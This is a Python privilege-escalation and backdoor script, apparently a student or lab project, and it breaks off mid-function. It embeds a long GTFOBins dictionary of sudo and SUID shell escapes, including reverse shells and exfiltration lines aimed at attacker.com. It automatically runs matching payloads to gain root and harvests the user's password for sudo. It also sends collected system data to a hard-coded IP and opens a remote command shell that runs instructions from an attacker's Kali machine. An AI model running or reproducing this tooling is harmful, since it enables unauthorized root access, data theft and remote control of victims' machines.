#!/usr/bin/env python
# coding: utf-8

# conditional import for older versions of python not compatible with subprocess


try:
	import subprocess as sub
	import os

	compatmode = 0  # newer version of python, no need for compatibility mode
except ImportError:
	import os  # older version of python, need to use os instead

	compatmode = 1
import socket
import subprocess
import time
import getpass

# title / formatting
bigline = "================================================================================================="
smlline = "-------------------------------------------------------------------------------------------------"
ip = "192.168.1.72"
root = False

gtfobinsDict1= {
            "apt": "sudo apt-get changelog apt\n!/bin/sh\n\n----TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n\n----sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh\n----",
            "apt-get": "sudo apt-get changelog apt\n!/bin/sh\n\n----TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n\n----sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\n----",
            "aria2c": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n\n",
            "arp": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n\n",
            "ash": "sudo ash\n",
            "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'\n",
            "base32": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n\n",
            "base64": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n\n",
            "basenc": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n\n",
            "bash": "bash -p",
            "bpftrace": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'\n----TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n\n----sudo bpftrace -c /bin/sh -e 'END {exit()}'\n----",
            "bundler": "sudo bundler help\n!/bin/sh\n\n",
            "busctl": "sudo busctl --show-machine\n!/bin/sh\n\n",
            "busybox": "sudo busybox sh\n",
            "byebug": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n\n",
            "cancel": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT\n\n",
            "capsh": "sudo capsh --\n",
            "cat": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n\n",
            "check_by_ssh": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx\n",
            "check_cups": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n\n",
            "check_log": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n\n",
            "check_memory": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n\n",
            "check_raid": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n\n",
            "check_ssl_cert": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n\n",
            "check_statusfile": "LFILE=file_to_read\nsudo check_statusfile $LFILE\n\n",
            "chmod": "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n\n",
            "chown": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n\n",
            "chroot": "sudo chroot /\n\n",
            "cobc": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n\n",
            "column": "LFILE=file_to_read\nsudo column $LFILE\n\n",
            "comm": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n\n",
            "composer": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n\n",
            "cowsay": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n\n",
            "cowthink": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n\n",
            "cp": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n\n----LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n----",
            "cpan": "sudo cpan\n! exec '/bin/bash'\n\n",
            "cpulimit": "sudo cpulimit -l 100 -f /bin/sh\n",
            "crash": "sudo crash -h\n!sh\n\n",
            "crontab": "sudo crontab -e\n",
            "csh": "sudo csh\n",
            "csplit": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n\n",
            "cupsfilter": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n\n",
            "curl": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n\n",
            "cut": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n\n",
            "dash": "sudo dash\n",
            "date": "LFILE=file_to_read\nsudo date -f $LFILE\n\n",
            "dd": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n\n",
            "dialog": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n\n",
            "diff": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n\n",
            "dig": "LFILE=file_to_read\nsudo dig -f $LFILE\n\n",
            "dmesg": "sudo dmesg -H\n!/bin/sh\n\n",
            "dmsetup": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n\n",
            "dnf": "sudo dnf install -y x-1.0-1.noarch.rpm\n\n",
            "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n",
            "dpkg": "sudo dpkg -l\n!/bin/sh\n\n----sudo dpkg -i x_1.0_all.deb\n----",
            "easy_install": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n\n",
            "eb": "sudo eb logs\n!/bin/sh\n\n",
            "ed": "sudo ed\n!/bin/sh\n\n",
            "emacs": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'\n",
            "env": "sudo env /bin/sh\n",
            "eqn": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n\n",
            "ex": "sudo ex\n!/bin/sh\n\n",
            "exiftool": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n\n",
            "expand": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n\n",
            "expect": "sudo expect -c 'spawn /bin/sh;interact'\n",
            "facter": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n\n",
            "file": "LFILE=file_to_read\nsudo file -f $LFILE\n\n",
            "find": "sudo find . -exec /bin/sh \\; -quit\n",
            "finger": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n\n",
            "flock": "sudo flock -u / /bin/sh\n",
            "fmt": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n\n",
            "fold": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n\n",
            "ftp": "sudo ftp\n!/bin/sh\n\n",
            "gawk": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'\n",
            "gcc": "sudo gcc -wrapper /bin/sh,-s .\n",
            "gdb": "sudo gdb -nx -ex '!sh' -ex quit\n",
            "gem": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc\n",
            "genisoimage": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n\n",
            "ghc": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'\n",
            "ghci": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n\n",
            "gimp": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'\n",
            "git": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help\n----sudo git -p help config\n!/bin/sh\n\n----sudo git branch --help config\n!/bin/sh\n\n----TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n\n----TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n\n----",
            "grep": "LFILE=file_to_read\nsudo grep '' $LFILE\n\n",
            "gtester": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n\n",
            "hd": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n\n",
            "head": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n\n",
            "hexdump": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n\n",
            "highlight": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n\n",
            "hping3": "sudo hping3\n/bin/sh\n\n",
            "iconv": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n\n",
            "iftop": "sudo iftop\n!/bin/sh\n\n",
            "install": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n\n",
            "ionice": "sudo ionice /bin/sh\n",
            "ip": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n\n----sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n\n----",
            "irb": "sudo irb\nexec '/bin/bash'\n\n",
            "jjs": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs\n",
            "join": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n\n",
            "journalctl": "sudo journalctl\n!/bin/sh\n\n",
            "jq": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n\n",
            "jrunscript": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"\n",
            "ksh": "sudo ksh\n",
            "ksshell": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n\n",
            "ld.so": "sudo /lib/ld.so /bin/sh\n",
            "ldconfig": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n\n",
            "less": "sudo less /etc/profile\n!/bin/sh\n\n",
            "logsave": "sudo logsave /dev/null /bin/sh -i\n",
            "look": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n\n",
            "ltrace": "sudo ltrace -b -L /bin/sh\n",
            "lua": "sudo lua -e 'os.execute(\"/bin/sh\")'\n",
            "lwp-download": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n\n",
            "lwp-request": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n\n",
            "mail": "sudo mail --exec='!/bin/sh'\n",
            "make": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n\n",
            "man": "sudo man man\n!/bin/sh\n\n",
            "mawk": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'\n",
            "more": "TERM= sudo more /etc/profile\n!/bin/sh\n\n",
            "mount": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n\n",
            "mtr": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n\n",
            "mv": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n\n",
            "mysql": "sudo mysql -e '\\! /bin/sh'\n",
            "nano": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n\n",
            "nawk": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'\n",
            "nc": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n\n",
            "nice": "sudo nice /bin/sh\n",
            "nl": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n\n",
            "nmap": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n----sudo nmap --interactive\nnmap> !sh\n\n----",
            "node": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n\n",
            "nohup": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"\n",
            "nroff": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n\n",
            "nsenter": "sudo nsenter /bin/sh\n",
            "od": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n\n",
            "openssl": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n\n",
            "paste": "LFILE=file_to_read\nsudo paste $LFILE\n\n",
            "pdb": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n\n",
            "perl": "sudo perl -e 'exec \"/bin/sh\";'\n",
            "pg": "sudo pg /etc/profile\n!/bin/sh\n\n",
            "php": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n\n",
            "pic": "sudo pic -U\n.PS\nsh X sh X\n\n",
            "pico": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n\n",
            "pip": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n\n",
            "pkexec": "sudo pkexec /bin/sh\n",
            "pr": "LFILE=file_to_read\npr -T $LFILE\n\n",
            "pry": "sudo pry\nsystem(\"/bin/sh\")\n\n",
            "psql": "psql\n\\?\n!/bin/sh\n\n",
            "puppet": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n\n",
            "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'\n",
            "rake": "sudo rake -p '`/bin/sh 1>&0`'\n",
            "readelf": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n\n",
            "red": "sudo red file_to_write\na\nDATA\n.\nw\nq\n\n",
            "redcarpet": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n\n",
            "restic": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n\n",
            "rev": "LFILE=file_to_read\nsudo rev $LFILE | rev\n\n",
            "rlogin": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST\n\n",
            "rlwrap": "sudo rlwrap /bin/sh\n",
            "rpm": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n----sudo rpm -ivh x-1.0-1.noarch.rpm\n\n----",
            "rpmquery": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'\n",
            "rsync": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n",
            "ruby": "sudo ruby -e 'exec \"/bin/sh\"'\n",
            "run-mailcap": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n\n",
            "run-parts": "sudo run-parts --new-session --regex '^sh$' /bin\n",
            "rview": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo rview -c ':lua os.execute(\"reset; exec sh\")'\n----",
            "rvim": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo rvim -c ':lua os.execute(\"reset; exec sh\")'\n----",
            "scp": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n\n",
            "screen": "sudo screen\n",
            "script": "sudo script -q /dev/null\n",
            "sed": "sudo sed -n '1e exec sh 1>&0' /etc/hosts\n",
            "service": "sudo service ../../bin/sh\n",
            "setarch": "sudo setarch $(arch) /bin/sh\n",
            "sftp": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n\n",
            "shuf": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n\n",
            "slsh": "sudo slsh -e 'system(\"/bin/sh\")'\n",
            "smbclient": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n\n",
            "socat": "sudo socat stdin exec:/bin/sh\n\n",
            "soelim": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n\n",
            "sort": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n\n",
            "split": "split --filter=/bin/sh /dev/stdin\n\n",
            "sqlite3": "sudo sqlite3 /dev/null '.shell /bin/sh'\n",
            "ss": "LFILE=file_to_read\nsudo ss -a -F $LFILE\n\n",
            "ssh": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x\n",
            "ssh-keyscan": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n\n",
            "start-stop-daemon": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh\n",
            "stdbuf": "sudo stdbuf -i0 /bin/sh\n",
            "strace": "sudo strace -o /dev/null /bin/sh\n",
            "strings": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n\n",
            "su": "sudo su\n",
            "sysctl": "LFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\"\n\n",
            "systemctl": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n\n----TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n\n----sudo systemctl\n!sh\n\n----",
            "tac": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n\n",
            "tail": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n\n",
            "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n",
            "taskset": "sudo taskset 1 /bin/sh\n",
            "tbl": "LFILE=file_to_read\nsudo tbl $LFILE\n\n",
            "tclsh": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n\n",
            "tcpdump": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n\n",
            "tee": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n\n",
            "telnet": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n\n",
            "tftp": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n\n",
            "time": "sudo /usr/bin/time /bin/sh\n",
            "timeout": "sudo timeout --foreground 7d /bin/sh\n",
            "tmux": "sudo tmux\n",
            "top": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n\n",
            "troff": "LFILE=file_to_read\nsudo troff $LFILE\n\n",
            "ul": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n\n",
            "unexpand": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n\n",
            "uniq": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n\n",
            "unshare": "sudo unshare /bin/sh\n",
            "update-alternatives": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n\n",
            "uudecode": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n\n",
            "uuencode": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n\n",
            "valgrind": "sudo valgrind /bin/sh\n",
            "vi": "sudo vi -c ':!/bin/sh' /dev/null\n",
            "view": "sudo view -c ':!/bin/sh'\n----sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo view -c ':lua os.execute(\"reset; exec sh\")'\n----",
            "vim": "sudo vim -c ':!/bin/sh'\n----sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo vim -c ':lua os.execute(\"reset; exec sh\")'\n----",
            "watch": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n",
            "wget": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE\n\n",
            "whois": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n\n----RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\"\n\n----",
            "wish": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n\n",
            "xargs": "sudo xargs -a /dev/null sh\n",
            "xmodmap": "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n\n",
            "xxd": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n\n",
            "xz": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n\n",
            "yelp": "LFILE=file_to_read\nyelp \"man:$LFILE\"\n\n",
            "yum": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n\n----TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n\n----",
            "zip": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n\n",
            "zsh": "sudo zsh\n",
            "zsoelim": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n\n",
            "zypper": "sudo zypper x\n\n----TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n\n----"
}

gtfobinsDict= {"bash": "bash -p",
               "find": "find . -exec /bin/sh -p \; -quit",
               "nmap": "nmap --interactive; !sh",
               "docker": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
               "env": "env /bin/sh -p",
               "expect": "/bin/expect -c 'spawn /bin/sh -p;interact'",
               "flock" : "/bin/flock -u / /bin/sh -p",
                                             }


def remove_file():
	if os.path.exists('project.txt'):
		os.remove('project.txt')


def appendToFile(msg):
	try:
		with open('project.txt', 'a') as opened_file:

			opened_file.write(msg + "\n")
	except Exception as ex:
		print("The script can not open the file")
		print(ex)
	finally:
		opened_file.close()


def sendFile():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.connect((ip, 9999))
	with open('project.txt', 'rb') as file:
		s.send("Get checker file".encode('ascii'))
		l = file.read(1024)
		while (l):
			s.send(l)
			l = file.read(1024)

	remove_file()

	print("Le fichier a été correctement copié et effacer ")


# loop through dictionary, execute the commands, store the results, return updated dict
def execCmd(cmdDict):
	for item in cmdDict:
		cmd = cmdDict[item]["cmd"]
		if compatmode == 0:  # newer version of python, use preferred subprocess
			out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
			print(out)

			results = out.split('\n')
		else:  # older version of python, use os.popen
			echo_stdout = os.popen(cmd, 'r')
			results = echo_stdout.read().split('\n')
		cmdDict[item]["results"] = results
	return cmdDict


# print results for each previously executed command, no return value
def printResults(cmdDict):
	for item in cmdDict:
		msg = cmdDict[item]["msg"]
		results = cmdDict[item]["results"]
		appendToFile("[+] " + msg)
		for result in results:
			if result.strip() != "":
				appendToFile("    " + result.strip())
		appendToFile("\n")
	return




def helpNeeded():
	try:

	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    s.connect((ip, 9999))
	    print("Trying get help")
	    s.send("Help needed !!!".encode('ascii'))
	    respone = s.recv(1024).decode("ascii").lower()

	    print(respone)
	  #  while True:

	    if "open" in respone:
		    while True:  # keep receiving commands from the Kali machine
			    command = s.recv(1024).decode('ascii')  # read the first KB of the tcp socket

			    if 'terminate' in command:  # if we got terminate order from the attacker, close the socket and break the loop
				    print("exit")
				    break

			    else:  # otherwise, we pass the received command to a shell process

				    CMD = sub.Popen(command, shell=True, stdout=sub.PIPE, stderr=sub.PIPE,
				                    stdin=sub.PIPE)
				    s.send(CMD.stdout.read())  # send back the result
				    s.send(CMD.stderr.read())  # send back the error -if any-, such as syntax error

	except Exception as ex:
	    print(ex)
	finally:
		s.close()


def findSUID():
	cmd = {"SUID": {"cmd": "find /usr/bin -perm -u=s -type f 2>/dev/null", "msg": "Searching for binaries with SUID",
	                "results": []}
	       }
	res = execCmd(cmd)
	suidList = res['SUID']['results']
	return suidList


def formatList(suidList):
	suidListDecoded = []
	binaries_pathsList = []
	binariesList = []

	# Decoding our lists of binarires found on the system
	for i in suidList:
		j = i.decode()
		suidListDecoded.append(j)

	# Format of the retrived binary  : /path/to/binary
	# Split to : path/to & binary
	suidListDecoded = suidList
	for binary in suidListDecoded:
		binary = os.path.split(binary)
		binaries_pathsList.append(binary)

	# Get only the list of binaries
	for binaryTuple in binaries_pathsList:
		path, binary = binaryTuple
		binariesList.append(binary)
	return binariesList


def matchbinaries(binariesList):
	# Search for common binaries between binaries list and gtfobins
	match_list = []
	gtfobinslist = list(gtfobinsDict.keys())
	for element in binariesList:
		if element in gtfobinsDict:
			match_list.append(element)

	return match_list


def checkIFRoot(binary):
	child = sub.Popen(binary, shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE)
	stdout, stderr = child.communicate(b'whoami')
	if stdout == b'root\n':
		return True


def privescalation(binariesList):
	binaries = matchbinaries(binariesList)
	if not binaries:
		return "No binaries with SUID found on system"
	else:
		print(" ############## Binaries with enabled SUID are : ##############\n" + ' '.join(binariesList))

		for binary in binaries:
			print("trying privilege escalation with " + binary)
			try:
				if checkIFRoot(gtfobinsDict[binary]):
					root = True
					return sub.Popen(gtfobinsDict[binary], shell=True).wait()
				else:
					print("failed with binary " + binary)
			except:
				return "Something went wrong while executing command : " + gtfobinsDict[binary]


def getUserName():
	return getpass.getuser()


def ifUserhasPass():
	username = str(getUserName())
	try:
		response = raw_input("Do you have the password of the user  " + username + "  [Y/N]? ")
		if response == 'yes':
			return True
		else:
			return False
	except:
		response = input("Do you have the password of the user  " + username + "  [Y/N]? ")
		if response == 'yes':
			return True
		else:
			return False


def getUserPass():
	pswd = getpass.getpass('Please enter your Password:')
	return pswd


def ifSudo_lreqPass():
	binary = "echo invalid | sudo -S -l"
	out, err = sub.Popen(binary, shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE).communicate()
	if err:
		return True
	else:
		return False


def getcmdwithSudo():
	cmd = {"SUDOERS": {"cmd": " sudo -l  2>/dev/null | sed -e '1,/run the following/ d' 2>/dev/null ",
	                   "msg": "Display list of commands that actual user may run with sudo ", "results": []}}
	res = execCmd(cmd)
	sudoList = res['SUDOERS']['results']
	return sudoList


def getcmdwithSudoWithPass(passwd):
	cmd = {"SUDOERS": {
		"cmd": 'echo "{passwd}" | sudo -S -l   2>/dev/null | sed -e  "1,/run the following/ d" 2>/dev/null '.format(
			passwd=passwd), "msg": "Display list of commands that actual user may run with sudo ", "results": []}}
	res = execCmd(cmd)
	sudoList = res['SUDOERS']['results']
	return sudoList


def ifdefault(password, reqsudo_l):
	default = "(ALL : ALL) ALL"
	if reqsudo_l:
		sudoList = getcmdwithSudo()
	elif not reqsudo_l:
		sudoList = getcmdwithSudoWithPass(password)
	#print(sudoList)
	for i in sudoList:
		if default in i:
			return True
		else:
			return False


def getListofRootCmdwithPass(sudoList):
	pattern1 = "(ALL) PASSWD"
	pattern2 = "(root) PASSWD"
	PassSudoList = []
	for line in sudoList:
		if (pattern1 or pattern2) in line:
			line = line.split(":")
			cmd = line[1]
			PassSudoList.append(cmd)
		else:
			pass
	return PassSudoList


def getListofCmdwithRoot(sudoList):
	pattern1 = "(ALL) NOPASSWD"
	pattern2 = "(root) NOPASSWD"
	noPassSudoList = []
	for line in sudoList:
		if (pattern1 or pattern2) in line:
			line = line.split(":")
			cmd = line[1]
			noPassSudoList.append(cmd)
		else:
			pass
	return noPassSudoList


def matchSudobinaries(noPassSudoList):
	match_list = []
	gtfobinslist = list(gtfobinsDict1.keys())
	for element in noPassSudoList:
		element = element.rsplit('/', 1)
		if element[1] in gtfobinsDict1:
			match_list.append(element[1])
	return match_list


def checkIFSudoRootWithNoPass(binary):
